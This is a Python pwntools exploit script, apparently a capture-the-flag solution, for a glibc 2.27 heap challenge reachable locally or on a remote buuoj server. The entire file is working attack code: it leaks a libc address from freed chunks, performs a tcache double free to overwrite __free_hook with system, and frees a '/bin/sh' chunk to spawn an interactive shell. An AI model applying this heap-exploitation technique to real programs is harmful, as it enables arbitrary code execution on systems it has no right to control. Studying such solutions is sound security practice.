import sys
from pwn import *
context.log_level='debug'
context.arch='amd64'

if len(sys.argv)==1 :
	io=process('./chall')
	elf=ELF('./chall')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
else :
	io=remote('node3.buuoj.cn',28256)
	elf=ELF('./chall')
	libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

def add(a,b,c):
	io.sendlineafter('Input your choice:','1')
	io.sendlineafter("Please input the size of girl's name\n",str(a))
	io.sendafter("please inpute her name:\n",b)
	io.sendafter("please input her call:",c)

def show(a):
	io.sendlineafter('Input your choice:','2')
	io.sendlineafter('Please input the index:\n',str(a))

def call(a):
	io.sendlineafter('Input your choice:','4')
	io.sendlineafter('Please input the index:\n',str(a))
for i in range(9):
	add(0x80,'name','123456')
for i in range(8):
	call(i)
show(7)
libc_base=u64(io.recv(20)[6:0xc]+'\x00\x00')-libc.sym['__malloc_hook']-0x10-0x60
success('libc_base:'+hex(libc_base))
for i in range(8):
	add(0x60,'/bin/sh\x00','123456')
for i in range(9,12):
	add(0x60,'/bin/sh\x00','123456')
call(9)
call(9)

add(0x60,p64(libc_base+libc.sym['__free_hook']),'123456')
add(0x60,'a','12345')
add(0x60,p64(libc_base+libc.sym['system']),'123')
call(11)


# gdb.attach(io)
# pause()
io.interactive()